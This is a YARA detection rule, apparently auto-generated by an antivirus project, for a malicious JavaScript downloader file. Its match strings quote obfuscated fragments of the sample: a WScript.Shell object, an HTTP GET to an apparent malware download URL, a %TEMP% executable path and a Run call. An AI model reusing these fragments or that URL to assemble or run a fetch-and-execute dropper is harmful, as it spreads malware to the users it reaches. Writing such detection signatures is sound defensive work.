rule sig_20160401_44181da2b9a24c5aee92ef3730ccff19 {
  meta:
    description = "datamaliciousorder - file 20160401_44181da2b9a24c5aee92ef3730ccff19.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3a3198d3da1d1d35da35adfe977bbe7dc743ed6eb520557adc0a4e499b141ad1"

  strings:
    $s1  = "function TabJy(PtrUgw, IcBks){GyRun = GyRun * 1; return PtrUgw - IcBks;};" fullword ascii
    $s2  = "var PeaVtc = function ObmMv() {return WScript[ZjId](\"WScript\"+\".Shell\");}(), ErgYx = 11;" fullword ascii
    $s3  = "JcmYcy[UeFc](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s4  = "if (JcmYcy[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JwcItz() {return ((FqTc == true) && (FqTc == WpbHj)) ? 1 : GyRun;};" fullword ascii
    $s6  = "function QfSh(){return EqQq + \"\";};" fullword ascii
    $s7  = "function DjVjx() {return PeaVtc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pDMP1eY5o.ex\" + \"e\";};" fullword ascii
    $s8  = "function AwWn(XbClh){PeaVtc[\"R\"+\"un\"](XbClh, GyRun, GyRun);};" fullword ascii
    $s9  = "function BamJk()" fullword ascii
    $s10 = "function WabVe(){return 23;};" fullword ascii
    $s11 = "return TabJy(YrJx, OiwTzt);" fullword ascii
    $s12 = "function KyjMng(AciRv) {var HnTh = (1, 2, 3, 4, 5, AciRv); return HnTh;};" fullword ascii
    $s13 = "var CqAf = false;" fullword ascii
    $s14 = "var FqTc = false;" fullword ascii
    $s15 = "var BkhWd = new this[\"Date\"]();" fullword ascii
    $s16 = "FqTc = true; " fullword ascii
    $s17 = "WpbHj = true; " fullword ascii
    $s18 = "function ZuYjo(){return ZjId;};" fullword ascii
    $s19 = "var WpbHj = false;" fullword ascii
    $s20 = "}while (HcnPpm);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}